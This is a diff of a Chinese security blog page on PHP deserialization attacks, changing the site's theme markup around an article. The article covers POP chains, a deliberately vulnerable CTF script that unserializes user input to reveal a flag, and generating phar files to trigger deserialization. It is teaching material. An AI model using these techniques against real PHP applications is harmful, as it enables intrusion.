@@ -2,181 +2,143 @@
 <html lang="en">
 <head>
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="keywords" content="Security">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="description" content="Code for fun, Hack for world">
-    <meta name="author" content="noname">
-    
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
     <title>
         
-            php反序列化 |
+        php反序列化 - undefined
         
-        Noname&#39;s Blog
     </title>
-    
-<link rel="stylesheet" href="/css/style.css">
 
-    <link rel="shortcut icon" href="/images/avatar.jpg">
+    <!-- Custom CSS -->
     
-<link rel="stylesheet" href="/css/font-awesome.min.css">
+<link rel="stylesheet" href="/css/aircloud.css">
 
-    <script id="hexo-configurations">
-    let KEEP = window.KEEP || {};
-    KEEP.hexo_config = {"hostname":"noname0519.com","root":"/","language":"en","path":"search.json"};
-    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":false,"init_open":false},"style":{"primary_color":"#669999","avatar":"/images/avatar.jpg","favicon":"/images/avatar.jpg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Code for fun, Hack for world"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":false,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.5"};
-    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
-  </script>
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
 <meta name="generator" content="Hexo 6.0.0"></head>
 
-
 <body>
-<div class="progress-bar-container">
-    
 
-    
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
 </div>
 
+<div class="index-about">
+    <i> Code for fun, Hack for world </i>
+</div>
 
-<main class="page-container">
-
+<div class="index-container">
     
-
-    <div class="page-main-content">
-
-        <div class="page-main-content-top">
-            <header class="header-wrapper">
-
-    <div class="header-content">
-        <div class="left">
-            
-            <a class="logo-title" href="/">
-                Noname&#39;s Blog
-            </a>
+    <div class="index-left">
+        <meta name="referrer" content="no-referrer-when-downgrade">
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <!-- <img src="/http://noname-image.test.upcdn.net/avatar.jpg" /> -->
+            <img src="http://noname-image.test.upcdn.net/avatar.jpg" />
         </div>
-
-        <div class="right">
-            <div class="pc">
-                <ul class="menu-list">
-                    
-                        <li class="menu-item">
-                            <a class=""
-                               href="/"
-                            >
-                                HOME
-                            </a>
-                        </li>
-                    
-                        <li class="menu-item">
-                            <a class=""
-                               href="/archives"
-                            >
-                                ARCHIVES
-                            </a>
-                        </li>
-                    
-                        <li class="menu-item">
-                            <a class=""
-                               href="/about"
-                            >
-                                ABOUT
-                            </a>
-                        </li>
-                    
-                    
-                </ul>
-            </div>
-            <div class="mobile">
-                
-                <div class="icon-item menu-bar">
-                    <div class="menu-bar-middle"></div>
-                </div>
-            </div>
+        <div class="name">
+            <i>Noname</i>
         </div>
     </div>
-
-    <div class="header-drawer">
-        <ul class="drawer-menu-list">
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/">HOME</a>
-                </li>
-            
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/archives">ARCHIVES</a>
-                </li>
-            
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/about">ABOUT</a>
-                </li>
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>SEARCH</span>
+                </a>
+            </li>
             
         </ul>
     </div>
-
-    <div class="window-mask"></div>
-
-</header>
-
-
-        </div>
-
-        <div class="page-main-content-middle">
-
-            <div class="main-content">
-
-                
-                    <div class="fade-in-down-animation">
-    <div class="article-content-container">
-
-        <div class="article-title">
-            <span class="title-hover-animation">php反序列化</span>
-        </div>
-
-        
-            <div class="article-header">
-                <div class="avatar">
-                    <img src="/images/avatar.jpg">
-                </div>
-                <div class="info">
-                    <div class="author">
-                        <span class="name">noname</span>
-                        
-                            <span class="author-label">Lv2</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
-    <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i>&nbsp;
-        <span class="pc">2022-01-20 11:00:00</span>
-        <span class="mobile">2022-01-20 11:00</span>
-    </span>
     
-    
-
-    
-    
-        <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>3.2k Words</span>
-        </span>
-    
-    
-        <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>15 Mins</span>
-        </span>
-    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">php反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5"><span class="toc-text">相关概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">反序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">php反序列化漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pop%E9%93%BE"><span class="toc-text">pop链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Example1"><span class="toc-text">Example1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XCTF-Web-php-unserialize"><span class="toc-text">XCTF-Web_php_unserialize</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar%E6%89%A9%E5%B1%95%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="toc-text">phar扩展反序列化攻击面</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phar%E6%96%87%E4%BB%B6"><span class="toc-text">phar文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%97%E5%BD%B1%E5%93%8D%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-text">受影响的函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90phar%E6%96%87%E4%BB%B6"><span class="toc-text">生成phar文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0phar%E6%96%87%E4%BB%B6"><span class="toc-text">伪造phar文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Example"><span class="toc-text">Example</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bypass"><span class="toc-text">bypass</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="toc-text">反序列化字符逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%84%E5%88%99"><span class="toc-text">规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%A2%9E%E5%8A%A0%E7%9A%84%E6%83%85%E5%86%B5"><span class="toc-text">字符增加的情况</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">session反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6"><span class="toc-text">session存储机制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8"><span class="toc-text">原生类利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SoapClient-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">SoapClient+反序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-text">防御方法</span></a></li></ol></li></ol>
+</div>
     
 </div>
 
-                    </div>
-                </div>
-            </div>
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> Code for fun, Hack for world </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
         
 
-        <div class="article-content markdown-body">
-            <h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1><h2 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h2><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>序列化的过程是将各种类和属性的信息转化成<strong>便于存储</strong>的字节流，也就是将数据信息进行一定格式的压缩存储</p>
+
+<div class="post-container">
+    <div class="post-title">
+        php反序列化
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2022-01-20 11:00:00</span></span>
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1><h2 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h2><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>序列化的过程是将各种类和属性的信息转化成<strong>便于存储</strong>的字节流，也就是将数据信息进行一定格式的压缩存储</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;noname&#x27;</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$id</span> = <span class="string">&#x27;666&#x27;</span>;</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;root123&#x27;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set_Pwd</span>(<span class="params"><span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_Pwd</span>(<span class="params"><span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;password;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$p</span> = <span class="keyword">new</span> Person();</span><br><span class="line">	<span class="keyword">echo</span> serialize(<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>不同的权限序列化的结果不一样</p>
@@ -262,7 +224,7 @@
 <h4 id="Example1"><a href="#Example1" class="headerlink" title="Example1"></a>Example1</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);<span class="variable">$flag</span>=file_get_contents(<span class="string">&#x27;/flag&#x27;</span>);highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;login(<span class="keyword">$this</span>-&gt;username, <span class="keyword">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = addslashes(<span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$password</span> = addslashes(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$password</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ban</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$times</span> = <span class="number">10</span> - (<span class="keyword">int</span>)<span class="variable">$_COOKIE</span>[<span class="string">&#x27;times&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$times</span> &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You have been banned&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$times</span> -= <span class="number">1</span>;</span><br><span class="line">            setcookie(<span class="string">&#x27;times&#x27;</span>, <span class="number">10</span> - <span class="variable">$times</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You have <span class="subst">$times</span> times to try.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Guest</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$role</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;role = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;login(<span class="keyword">$this</span>-&gt;username, <span class="keyword">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = addslashes(<span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$password</span> = addslashes(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&#x27;guest&#x27;</span> &amp;&amp; <span class="variable">$password</span> === <span class="string">&#x27;guest&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;role = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$role</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;role = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = <span class="keyword">new</span> Admin(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;login(<span class="keyword">$this</span>-&gt;username, <span class="keyword">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// var_dump($username);</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&#x27;guest&#x27;</span> &amp;&amp; <span class="variable">$password</span> === <span class="string">&#x27;guest&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;role = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;admin-&gt;ban();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;times&#x27;</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">&#x27;times&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">&#125;unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);</span><br></pre></td></tr></table></figure>
 
 <p>这里通过分析魔法函数的触发条件，可以得到一个链子<br>pop链：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-&gt;__wakeup =&gt; User-&gt;login =&gt; Guest-&gt;__call =&gt; Guest-&gt;login =&gt;Admin-&gt;__toString =&gt; Admin-&gt;login </span><br></pre></td></tr></table></figure>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U<span class="function"><span class="title">ser</span>-&gt;</span>__<span class="function"><span class="title">wakeup</span> =&gt; User-&gt;</span><span class="function"><span class="title">login</span> =&gt; Guest-&gt;</span>__<span class="function"><span class="title">call</span> =&gt; Guest-&gt;</span><span class="function"><span class="title">login</span> =&gt;Admin-&gt;</span>__<span class="function"><span class="title">toString</span> =&gt; Admin-&gt;</span>login </span><br></pre></td></tr></table></figure>
 
 <p>在实例化三个类的对象后，将User类对象的admin赋值为Guest类的对象，使其能满足</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&#x27;guest&#x27;</span> &amp;&amp; <span class="variable">$password</span> === <span class="string">&#x27;guest&#x27;</span>) &#123;                 </span><br><span class="line">    <span class="keyword">$this</span>-&gt;role = <span class="number">0</span>;                 </span><br><span class="line">    <span class="keyword">$this</span>-&gt;admin-&gt;ban();           </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -286,12 +248,12 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Destruct called&quot;</span>；</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;phar://phar.phar/test.txt&#x27;</span>;</span><br><span class="line">    file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="phar文件"><a href="#phar文件" class="headerlink" title="phar文件"></a>phar文件</h3><p>phar是一种压缩格式的文件，有四个构成部分<br>1.stub<br>格式：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="meta">&lt;?php</span> xxx; <span class="comment"><span class="keyword">__HALT_COMPILER</span>();?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>前面内容不限但必须以<code>__HALT_COMPILER();?&gt;</code>结尾，否则phar扩展无法识别这个文件为phar文件<br>2.manifest describing the contents<br>被压缩文件的权限属性。会以<strong>序列化</strong>的形式存储用户自定义的meta-data。<br>3.contents<br>被压缩文件的内容<br>4.signature<br>签名，在文件末尾</p>
 <h4 id="受影响的函数"><a href="#受影响的函数" class="headerlink" title="受影响的函数"></a>受影响的函数</h4><p><img src="en-resource://database/619:1" alt="99cf31f015aa9eaf557de539d5ee9b28.png"></p>
 <h4 id="生成phar文件"><a href="#生成phar文件" class="headerlink" title="生成phar文件"></a>生成phar文件</h4><p>修改本地<code>php.ini</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar.readonly = Off</span><br></pre></td></tr></table></figure>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">phar.readonly</span> = <span class="literal">Off</span></span><br></pre></td></tr></table></figure>
 
 <p>注意：php版本要在5.3以上，修改配置文件时要去掉分号<br>生成phar文件</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> TestObject();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -313,7 +275,7 @@
